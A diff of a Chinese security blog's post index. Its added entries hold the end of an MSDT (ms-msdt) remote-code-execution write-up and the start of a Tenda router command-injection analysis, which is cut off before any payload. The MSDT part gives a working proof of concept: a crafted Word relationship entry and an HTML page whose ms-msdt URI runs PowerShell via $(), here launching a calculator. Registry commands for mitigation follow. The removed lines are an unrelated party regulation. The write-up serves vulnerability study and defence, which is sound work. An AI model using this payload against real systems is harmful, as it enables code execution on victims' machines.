+<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
+<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
+{
+    $Env:RecommendedLayer = $AppInfo[2]
+    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
+}
+else
+{
+    Start-Process -FilePath $AppInfo[1]
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
+IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
+&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
+<p>包含$()中的代码会通过PowerShell执行</p>
+<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
+<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
+<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
+<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
+<p><strong>禁用方法：</strong></p>
+<p>1.以管理员身份运行命令提示符</p>
+<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
+<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
+<p><strong>撤销禁用：</strong></p>
+<p>1.以管理员身份运行命令提示符</p>
+<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2022-34713 MSDT目录遍历漏洞分析</title>
     <url>/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞。存在路径穿越的脆弱性，攻击者可以遍历目录，将恶意可执行程序放置Window启动文件夹。<br>影响版本：</p>
@@ -2554,154 +2498,59 @@ CLEANUP:
       </tags>
   </entry>
   <entry>
-    <title>纪检监察机关派驻机构工作规则（2022年6月22日）</title>
-    <url>/2024/10/20/%E7%BA%AA%E6%A3%80%E7%9B%91%E5%AF%9F%E6%9C%BA%E5%85%B3%E6%B4%BE%E9%A9%BB%E6%9C%BA%E6%9E%84%E5%B7%A5%E4%BD%9C%E8%A7%84%E5%88%99%EF%BC%882022%E5%B9%B46%E6%9C%8822%E6%97%A5%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><p>  <strong>第一条</strong> 为了加强和规范纪检监察机关派驻机构工作，根据《中国共产党纪律检查委员会工作条例》和《中华人民共和国监察法》，制定本规则。</p>
-<p>  <strong>第二条</strong> 派驻机构工作坚持以习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，坚持自我革命，坚持敢于斗争，坚持实事求是，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，建立健全系统集成、协同高效的派驻监督体制机制，增强“派”的权威和“驻”的优势，一体推进不敢腐、不能腐、不想腐，充分发挥监督保障执行、促进完善发展作用。</p>
-<p>  <strong>第三条</strong> 在党中央集中统一领导下，中央纪律检查委员会国家监察委员会向中央一级党和国家机关以及其他组织派驻纪检监察机构，地方各级纪律检查委员会监察委员会向本级党和国家机关以及其他组织派驻纪检监察机构。派驻机构是派出机关的组成部分，与驻在单位是监督和被监督的关系。</p>
-<p>  派驻机构应当强化政治监督，把坚持和加强党的领导贯穿工作全过程各方面，推动驻在单位切实做到“两个维护”，贯彻党的理论和路线方针政策，落实党中央决策部署。</p>
-<p>  <strong>第四条</strong> 派驻机构遵循以下原则开展工作：</p>
-<p>  （一）坚持党中央集中统一领导，强化组织自上而下的监督功能；</p>
-<p>  （二）坚持民主集中制，重要事项集体研究决定；</p>
-<p>  （三）坚持敢于善于监督，完善常态化监督工作机制；</p>
-<p>  （四）坚持职责定位，依规依纪依法履行职责；</p>
-<p>  （五）坚持各项监督统筹衔接，推动全面从严治党主体责任和监督责任一体落实；</p>
-<p>  （六）坚持监督与被监督相统一，自觉接受各方面监督。</p>
-<p>第五条 派驻机构应当持续深化转职能、转方式、转作风，聚焦全面从严治党、党风廉政建设和反腐败工作，强化监督职责，突出工作重点，创新履职方式，有效运用“四种形态”，增强派驻监督全覆盖的有效性，推动派驻监督工作高质量发展。</p>
-<h2 id="第二章-组织设置"><a href="#第二章-组织设置" class="headerlink" title="第二章 组织设置"></a>第二章 组织设置</h2><p>  <strong>第六条</strong> 中央纪律检查委员会国家监察委员会向中央一级党和国家机关、中管金融企业派驻纪检监察组。地方各级纪律检查委员会监察委员会向本级党和国家机关、所管辖的国有金融企业派驻纪检监察组。</p>
-<p>  中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会按照规定向国有企业、普通高等学校等单位派驻纪检监察组；或者依法派驻监察机构，派驻监察专员并设立监察专员办公室，与该单位党的纪律检查机构合署办公。</p>
-<p>  对系统规模大、直属单位多、监督对象多的单位，可以单独派驻纪检监察组；对业务关联度高，或者需要统筹力量实施监督的相关单位，可以综合派驻纪检监察组。</p>
-<p>  <strong>第七条</strong> 派驻机构主要负责人按照规定担任驻在单位的党组（党委）成员，履行监督专责，不分管驻在单位工作。</p>
-<p>  派驻机构主要负责人实行交流任职、定期轮岗。</p>
-<p>  <strong>第八条</strong> 派驻机构的领导机构是组务会。组务会由派驻机构正职、副职组成。组务会会议学习贯彻落实党中央决策部署，贯彻中央纪委国家监委工作部署，落实派出机关工作安排，研究讨论管辖范围内纪检监察工作的重要问题、重要事项，按照权限讨论或者决定党纪政务处分等事项。</p>
-<p>  派驻机构应当健全组务会会议以及组长办公会议、专题会议等会议制度，完善议事决策机制。</p>
-<p>  <strong>第九条</strong> 派驻机构应当按照信访举报、监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的原则，结合实际设置内设机构或者明确人员分工。</p>
-<h2 id="第三章-领导体制"><a href="#第三章-领导体制" class="headerlink" title="第三章 领导体制"></a>第三章 领导体制</h2><p>  <strong>第十条</strong> 各级党委应当加强对纪检监察机关派驻机构工作的领导，健全机构设置、干部管理、工作保障等机制，听取纪律检查委员会监察委员会关于派驻监督工作的汇报，推动派驻机构履职尽责。</p>
-<p>  <strong>第十一条</strong> 驻在单位应当支持配合派驻机构工作，主动及时通报重要情况、重要问题，根据派驻机构工作需要提供有关材料，为派驻机构开展工作创造条件、提供保障。</p>
-<p>  <strong>第十二条</strong> 派驻机构由派出机关直接领导、统一管理，向派出机关负责，受派出机关监督。</p>
-<p>  各级纪律检查委员会常务委员会应当定期听取派驻监督工作情况报告。派出机关分管领导应当定期召开派驻机构负责人会议，经常同派驻机构主要负责人研究工作。</p>
-<p>  <strong>第十三条</strong> 派出机关相关部门根据职能职责，加强对派驻机构的指导、联系、服务和保障。</p>
-<p>  监督检查部门协助分管领导联系派驻机构日常工作：</p>
-<p>  （一）指导督促派驻机构履行职责；</p>
-<p>  （二）对派驻机构请示报告的问题、事项进行审核把关；</p>
-<p>  （三）对派出机关交办的重要案件、事项进行督促办理；</p>
-<p>  （四）办理派驻机构提请支持、协调的重要事项；</p>
-<p>  （五）向派驻机构通报驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员的一般性问题和谈话提醒、批评教育、责令检查、诫勉谈话等情况；</p>
-<p>  （六）联系开展其他工作。</p>
-<p>  <strong>第十四条</strong> 派出机关相关部门应当会同派驻机构联合开展以下监督工作：</p>
-<p>  （一）开展专项检查，推动驻在单位落实党中央决策部署；</p>
-<p>  （二）研判驻在单位政治生态，有针对性地开展监督；</p>
-<p>  （三）开展专题调查研究，查找分析利用公共权力和资源设租寻租、离职后违规从业等行业性、系统性廉洁风险，向驻在单位提出意见建议或者督促开展专项治理；</p>
-<p>  （四）支持配合派出机关同级党委巡视巡察机构开展工作，对整改情况进行监督；</p>
-<p>  （五）推动驻在单位落实纪检监察建议；</p>
-<p>  （六）其他需要联合开展的监督工作。</p>
-<p>  <strong>第十五条</strong> 派出机关监督检查部门、审查调查部门对于派驻机构管辖的重大、复杂案件，经批准可以直接办理或者组织、指挥办理。</p>
-<p>  <strong>第十六条</strong> 派出机关相关部门应当指导、协调派驻机构与地方纪律检查委员会监察委员会协作开展以下工作：</p>
-<p>  （一）协同开展专项检查、专项监督，推动解决有关系统和领域的突出问题；</p>
-<p>  （二）协作采取监督检查、审查调查措施；</p>
-<p>  （三）协商确定驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件的管辖，或者由派驻机构报请派出机关指定有关地方纪委监委管辖；</p>
-<p>  （四）联合审查调查驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件；</p>
-<p>  （五）其他需要协作开展的工作。</p>
-<p>  <strong>第十七条</strong> 派出机关相关部门应当组织、指导各派驻机构之间协作配合开展以下工作：</p>
-<p>  （一）针对共性或者关联性问题同步开展专项监督；</p>
-<p>  （二）对重大、复杂案件进行联合审查调查；</p>
-<p>  （三）协作开展案件审理、复议复查和复审工作；</p>
-<p>  （四）对派出机关部署的重要工作落实情况开展交叉检查或者联合检查；</p>
-<p>  （五）联合开展调研、培训；</p>
-<p>  （六）其他需要协作配合开展的工作。</p>
-<p>  <strong>第十八条</strong> 派驻机构应当加强对驻在单位内设纪检机构及直属单位纪检机构的业务指导和监督检查，督促、支持其发挥职能作用，推动纪检干部队伍建设，加强政治教育和业务培训，协调人员力量开展监督执纪工作。</p>
-<p>  <strong>第十九条</strong> 派驻垂直管理单位的纪检监察组应当加强对驻在单位的下一级单位纪检机构的业务指导和监督检查，对驻在单位各级纪检机构的工作进行统筹，推动层层落实监督责任。下一级单位纪检机构的监督执纪工作以派驻纪检监察组领导为主，线索处置和案件查办在向同级党组（党委）报告的同时应当一并向派驻纪检监察组报告。</p>
-<p>  实行双重领导并以上级单位领导为主的单位，国有企业、国有金融企业的派驻机构工作，参照前款规定执行。</p>
-<p>  <strong>第二十条</strong>各级纪律检查委员会监察委员会派出的机关纪检监察工作委员会，按照规定审理有关派驻机构审查调查的案件，定期向派出机关报告案件审理工作情况。在派出机关领导下，建立健全案件质量评查机制，向派驻机构反馈评查结果。</p>
-<p>  机关纪检监察工作委员会应当加强与派驻机构的沟通协调，对本级党和国家机关部门机关纪委的执纪审查工作进行协同指导。</p>
-<p>  <strong>第二十一条</strong> 派驻国有资产监管机构、教育行政部门等的纪检监察组，按照规定协助派出机关加强对国有企业、普通高等学校等单位派驻机构工作的指导，形成监督合力。</p>
-<p>  派驻国有资产监管机构的纪检监察组，应当加强对驻在单位党组（党委）管理领导班子的国有企业纪检机构监督执纪工作的领导。相关国有企业纪检机构的线索处置和案件查办在向同级党委报告的同时，应当一并向派驻纪检监察组报告。</p>
-<h2 id="第四章-工作职责"><a href="#第四章-工作职责" class="headerlink" title="第四章 工作职责"></a>第四章 工作职责</h2><p>  <strong>第二十二条</strong> 派驻机构依规依纪依法履行监督执纪问责和监督调查处置职责。</p>
-<p>  <strong>第二十三条</strong> 派驻机构应当把监督作为基本职责，结合驻在单位实际，重点监督检查以下情况：</p>
-<p>  （一）对党忠诚，践行党的性质宗旨情况；</p>
-<p>  （二）贯彻党的理论和路线方针政策、落实党中央决策部署、践行“两个维护”情况；</p>
-<p>  （三）落实全面从严治党主体责任、加强党风廉政建设和反腐败工作情况；</p>
-<p>  （四）贯彻执行民主集中制、依规依法履职用权、廉洁自律等情况。</p>
-<p>  <strong>第二十四条</strong> 派驻机构应当重点监督以下对象：</p>
-<p>  （一）驻在单位领导班子及其成员特别是主要负责人；</p>
-<p>  （二）驻在单位上级党委管理的其他人员；</p>
-<p>  （三）驻在单位党组（党委）管理的领导班子及其成员；</p>
-<p>  （四）其他列入重点监督对象的驻在单位人员。</p>
-<p>  <strong>第二十五条</strong> 派驻机构应当支持和督促驻在单位党组（党委）落实全面从严治党主体责任，协助其开展内部巡视巡察，推动驻在单位深化改革、健全制度、完善治理、防控风险。</p>
-<p>  <strong>第二十六条</strong> 派驻机构应当结合派驻监督工作情况，推动驻在单位党组（党委）开展全面从严治党、党风廉政建设和反腐败工作的形势任务教育，强化纪法教育、警示教育，推进廉洁文化建设，教育引导党员、干部以及监察对象修身律己，筑牢思想道德防线。</p>
-<p>  <strong>第二十七条</strong> 派驻机构对反映驻在单位党组织和党员、干部以及监察对象问题的检举控告，按照规定受理和处置。</p>
-<p>  <strong>第二十八条</strong> 派驻机构对驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员涉嫌违纪和职务违法、职务犯罪问题线索，经批准可以参与派出机关的初步核实、审查调查工作。</p>
-<p>  <strong>第二十九条</strong> 派驻机构负责审查以下党组织和党员涉嫌违犯党纪的案件：</p>
-<p>  （一）驻在单位党组（党委）直接领导的党组织；</p>
-<p>  （二）驻在单位党组（党委）管理的领导班子成员；</p>
-<p>  （三）本规则第二十四条第四项规定的人员。</p>
-<p>  派驻机构必要时可以审查驻在单位党组（党委）管理的其他党组织和党员涉嫌违犯党纪的案件。</p>
-<p>  派驻机构根据派出机关授权，依法调查驻在单位监察对象涉嫌职务违法、职务犯罪案件。</p>
-<p>  <strong>第三十条</strong> 派驻机构按照管理权限，对违纪违法的驻在单位党组织和党员、干部以及监察对象进行处理处分，对不履行或者不正确履行职责的驻在单位党组织和领导干部进行问责。</p>
-<p>  <strong>第三十一条</strong> 派驻机构负责受理和处置以下申诉或者复审申请：</p>
-<p>  （一）党组织和党员对派驻机构所作处理决定不服的申诉；</p>
-<p>  （二）监察对象对派驻机构所作处理决定不服的复审申请；</p>
-<p>  （三）被调查人及其近亲属对派驻机构及其工作人员侵害被调查人合法权益行为的申诉。</p>
-<p>  对于派驻机构立案审查调查后由驻在单位作出处理决定案件的申诉或者复核申请，派驻机构应当协助驻在单位做好有关处置工作。</p>
-<h2 id="第五章-履职程序"><a href="#第五章-履职程序" class="headerlink" title="第五章 履职程序"></a>第五章 履职程序</h2><p>  <strong>第三十二条</strong> 派驻机构开展日常监督应当深入实际、深入群众，监督方式包括：</p>
-<p>  （一）参加会议。参加或者列席驻在单位领导班子会议等重要会议，了解学习贯彻党中央决策部署以及上级党组织决定情况和班子成员的意见态度，“三重一大”决策制度执行情况，按照规定向派出机关报告。</p>
-<p>  （二）谈心谈话。同党员、干部和群众广泛谈心谈话，听取对监督对象的反映，发现监督对象存在苗头性、倾向性问题的，进行谈话提醒、批评教育。</p>
-<p>  （三）听取汇报。听取驻在单位党组（党委）管理的领导班子及其成员履行管党治党责任情况的汇报，发现责任落实不到位的，进行提醒纠正。</p>
-<p>  （四）查阅资料。按照规定查阅、复制驻在单位有关文件、资料、数据等材料，了解核实有关情况。</p>
-<p>  （五）沟通情况。加强与驻在单位机关党委、党委办公室和组织人事、巡视巡察、法规法务、财务审计等部门的沟通，及时发现和通报问题。</p>
-<p>  （六）分析研判。分析信访举报、党风廉政等情况，对典型性、普遍性问题向驻在单位提出意见建议。</p>
-<p>  （七）廉政把关。建立健全、动态更新驻在单位党组（党委）管理的领导干部廉政档案，严把党风廉政意见回复关。</p>
-<p>  （八）实地调查。开展驻点调研、现场核查，精准发现驻在单位存在的突出问题。</p>
-<p>  （九）其他开展日常监督的方式。</p>
-<p>  <strong>第三十三条</strong> 派驻机构应当严格执行报告制度，发现驻在单位领导班子及其成员重要问题、重要事项及时向派出机关报告。</p>
-<p>  派驻机构应当经常对驻在单位领导班子及其成员坚持党的领导、加强党的建设、履行全面从严治党主体责任情况以及党风廉政状况进行分析，每年向派出机关提交专题报告。</p>
-<p>  &nbsp;<strong>第三十四条</strong> 派驻机构应当定期会同驻在单位党组（党委）专题研究全面从严治党、党风廉政建设和反腐败工作。派出机关监督检查部门根据情况派员参加。</p>
-<p>  派驻机构主要负责人应当经常与驻在单位党组（党委）主要负责人就政治生态、作风建设、廉洁风险等情况交换意见，提出工作建议，督促完善有关制度措施。</p>
-<p>  <strong>第三十五条</strong> 派驻机构应当向驻在单位领导班子成员通报其分管部门和单位领导干部遵守党章党规党纪、廉洁自律等情况，推动领导班子成员落实“一岗双责”要求，抓好分管部门和单位的党风廉政建设工作。</p>
-<p>  <strong>第三十六条</strong> 派驻机构对驻在单位开展内部巡视巡察提供以下协助：</p>
-<p>  （一）通报监督执纪执法中发现的问题；</p>
-<p>  （二）处置内部巡视巡察移交的问题线索；</p>
-<p>  （三）检查整改责任落实情况；</p>
-<p>  （四）其他协助内部巡视巡察的工作。</p>
-<p>  <strong>第三十七条</strong> 派驻机构应当指定专人负责管理涉嫌违纪和职务违法、职务犯罪问题线索，逐件编号登记，建立管理台账。</p>
-<p>  派驻机构应当结合日常监督掌握的情况，对问题线索进行综合分析、适当了解，采取谈话函询、初步核实、暂存待查、予以了结等方式进行处置。线索处置意见应当自收到线索之日起1个月内提出。</p>
-<p>  处置问题线索应当报派驻机构主要负责人审批，并按照规定报派出机关备案。</p>
-<p>  <strong>第三十八条</strong> 派驻机构经过初步核实，需要进行立案审查调查的，应当报派驻机构主要负责人审批。其中，对驻在单位党组（党委）直接领导的党组织、党组（党委）管理的领导班子成员中的正职领导干部立案和副职领导干部涉嫌严重职务违法、职务犯罪立案的，应当报派出机关审批。</p>
-<p>  派驻机构在立案前应当征求驻在单位党组（党委）主要负责人意见，对于有不同意见的应当报派出机关决定。确因安全保密等特殊情况，经派出机关同意，也可以在立案后及时向驻在单位党组（党委）主要负责人通报。</p>
-<p>  <strong>第三十九条</strong> 派驻机构按照规定报批后，可以依规依纪依法采取谈话、讯问、询问、留置、查询、冻结、搜查、调取、查封、扣押（暂扣、封存）、勘验检查、鉴定措施。对依法应当交有关机关执行的措施，报派出机关审批并以派出机关名义办理。</p>
-<p>  派驻机构应当对审查调查措施进行严格监管，建立措施使用台账，定期将有关情况报派出机关案件监督管理部门、监督检查部门备案。</p>
-<p>  <strong>第四十条</strong> 派驻机构审查调查工作结束后，应当按照规定进行审理，提出纪律处理或者党纪处分建议、拟作出的政务处分决定或者处分建议，通报驻在单位党组（党委）。</p>
-<p>  <strong>第四十一条</strong> 驻在单位党组（党委）按照权限和程序，对违纪的党组织、党员作出纪律处理或者党纪处分决定。</p>
-<p>  派驻机构按照管理权限，对违法的监察对象依法作出政务处分决定；建议驻在单位处分的，由驻在单位依法依规作出处分决定。</p>
-<p>  派驻机构提出的处理处分建议与驻在单位党组（党委）的意见不同又不能协商一致的，由派驻机构报派出机关研究决定。</p>
-<p>  <strong>第四十二条</strong> 派驻机构发现驻在单位党组（党委）管理的党组织和领导干部失职失责造成严重后果或者恶劣影响，需要进行问责调查的，应当报派驻机构主要负责人审批后，启动问责调查程序。</p>
-<p>  派驻机构应当依规依纪依法开展问责调查，查明失职失责问题，按照管理权限作出问责决定，或者向有权作出问责决定的党组织（单位）提出问责建议。</p>
-<p>  对党组织采取改组方式问责的，按照党章和其他党内法规规定的权限、程序执行。对领导干部采取党纪政务处分方式问责的，按照本规则第三十八条、第四十条、第四十一条办理。</p>
-<p>  <strong>第四十三条</strong> 派驻机构对调查的监察对象和涉案人员涉嫌职务犯罪案件，经集体审议，认为犯罪事实清楚，证据确实、充分，需要追究刑事责任的，依法依规移送人民检察院审查起诉。</p>
-<p>  <strong>第四十四条</strong> 派驻机构发现驻在单位在贯彻党中央决策部署、落实全面从严治党主体责任、开展党风廉政建设以及决策机制、监督管理、制度执行等方面存在突出问题或者薄弱环节的，应当提出纪检监察建议。</p>
-<p>派驻机构应当加强对驻在单位问题整改情况的监督检查，督促限期整改、反馈，推动纪检监察建议落实到位。</p>
-<h2 id="第六章-管理监督"><a href="#第六章-管理监督" class="headerlink" title="第六章 管理监督"></a>第六章 管理监督</h2><p>  <strong>第四十五条</strong> 派驻机构必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，以党的政治建设为统领推进党的各方面建设，教育引导派驻机构干部忠于职守、履职尽责，不断提高政治判断力、政治领悟力、政治执行力，带头增强“四个意识”、坚定“四个自信”、做到“两个维护”，发扬党的优良传统和作风，加强思想淬炼、政治历练、实践锻炼、专业训练，增强法治意识、程序意识、证据意识，建设政治素质高、忠诚干净担当、专业化能力强、敢于善于斗争的派驻机构干部队伍。</p>
-<p>  派驻机构党组织应当严格执行党的组织生活制度，推进党支部标准化规范化建设，增强党组织政治功能和组织力凝聚力，发挥战斗堡垒作用。</p>
-<p>  <strong>第四十六条</strong> 派出机关应当严把派驻机构干部入口关，按照干部管理权限统筹派出机关和派驻机构干部的选拔任用、人员交流、考核培训、监督管理，有计划地安排派驻机构干部参与派出机关工作、进行培养锻炼。</p>
-<p>  <strong>第四十七条</strong> 派出机关应当每年组织派驻机构主要负责人进行述责述廉。结合驻在单位特点，对派驻机构履行职责以及自身建设等方面情况进行考核。考核中，应当听取驻在单位领导班子和有关方面的意见，并将其作为考核的重要依据。</p>
-<p>  <strong>第四十八条</strong> 派驻机构应当加强规范化、法治化、正规化建设，明确职权范围，健全内控机制，规范工作流程和审批权限，完善回避、保密和过问、干预案件登记备案等管理制度，建立健全办案安全责任制，推动各项工作依规依纪依法进行。</p>
-<p>  <strong>第四十九条</strong> 派驻机构应当坚持打铁必须自身硬，坚持严的标准，勇于刀刃向内，牢固树立监督者更要自觉接受监督的意识，加强自我管理、自我约束，不断提高免疫力，切实防治“灯下黑”。</p>
-<p>  派驻机构应当接受派出机关同级党委巡视巡察监督和派出机关的管理监督，对所提监督意见进行整改落实，并报告整改情况。</p>
-<p>  派驻机构应当明确专门机构或者人员负责干部日常管理监督工作，及时汇总各方面意见，对自身权力运行的关键环节进行经常性检查，认真核查相关检举控告，按照规定将处置情况向派出机关干部监督部门报告。</p>
-<p>  派驻机构应当听取驻在单位领导班子对派驻机构工作的意见建议，认真研究处理，并及时反馈。自觉接受驻在单位党员、干部和群众的监督，畅通意见反映渠道，对反映的问题进行调查核实处置，不断完善制度、改进工作。</p>
-<p>  <strong>第五十条</strong> 派驻机构干部有跑风漏气、迟报瞒报、滥用职权、以案谋私以及其他违规违纪违法行为的，依规依纪依法严肃处理；构成犯罪的，依法追究刑事责任。</p>
-<p>  <strong>第五十一条</strong> 派驻机构及其领导干部不履行或者不正确履行职责，导致应当发现的问题没有发现，或者发现问题不报告不处置，执纪执法不严格不规范，造成严重后果或者恶劣影响的，予以严肃问责。</p>
-<h2 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h2><p>  <strong>第五十二条</strong> 本规则涉及的审批权限均指最低审批权限，工作中根据需要可以按照更高层级的审批权限报批。</p>
-<p>  <strong>第五十三条</strong> 派驻国有企业、普通高等学校的监察机构、监察专员（监察专员办公室）除执行本规则外，还应当执行中央纪律检查委员会国家监察委员会相关规定。</p>
-<p>  <strong>第五十四条</strong> 中央军事委员会可以根据本规则制定相关细则。</p>
-<p>  <strong>第五十五条</strong> 本规则由中央纪律检查委员会国家监察委员会负责解释。</p>
-<p>  <strong>第五十六条</strong> 本规则自发布之日起施行。此前发布的其他有关纪检监察机关派驻机构工作的规定，凡与本规则不一致的，按照本规则执行。</p>
+    <title>CVE-2022-37810 Tenda路由器命令注入分析</title>
+    <url>/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Tenda AC1206(v15.03.06.23)存在formWriteFacMac命令注入漏洞，可以通过mac参数执行任意命令。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>US_AC1206V1.0RTL_V15.03.06.23_multi_TD01</p>
+<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
+<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="qemu执行"><a href="#qemu执行" class="headerlink" title="qemu执行"></a>qemu执行</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103057802.png"></p>
+<p>mips小端</p>
+<pre class="line-numbers language-none"><code class="language-none">cd _US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin.extracted/squashfs-root/
+cp $(which qemu-mipsel-static) ./
+sudo ./qemu-mipsel-static -L ./ ./bin/httpd
+sudo chroot ./ ./qemu-mipsel-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103628491.png"></p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121104528268.png"></p>
+<p>main函数中0x00433a68有对apmib_init的判断，patch掉，bnez改为beqz</p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121111549227.png"></p>
+<p>ConnectCfm也需要改掉</p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121112030522.png"></p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161405750.png"></p>
+<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
+sudo brctl addif br0 eth0
+sudo ifconfig br0 up
+sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161943583.png"></p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162340458.png"></p>
+<h4 id="formWriteFacMac"><a href="#formWriteFacMac" class="headerlink" title="formWriteFacMac"></a>formWriteFacMac</h4><p>漏洞点在http的formWriteFacMac函数，IDA定位关键函数fromWirteFacMac，控制了mac参数就能利用doSystemCmd实现命令注入。</p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162811780.png"></p>
+<h4 id="doSystemCmd"><a href="#doSystemCmd" class="headerlink" title="doSystemCmd"></a>doSystemCmd</h4><p>doSystemCmd函数不在httpd中，在libcommon.so中</p>
+<p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121164709994.png"></p>
+<p>交叉引用查看formWriteFacMac函数调用链</p>
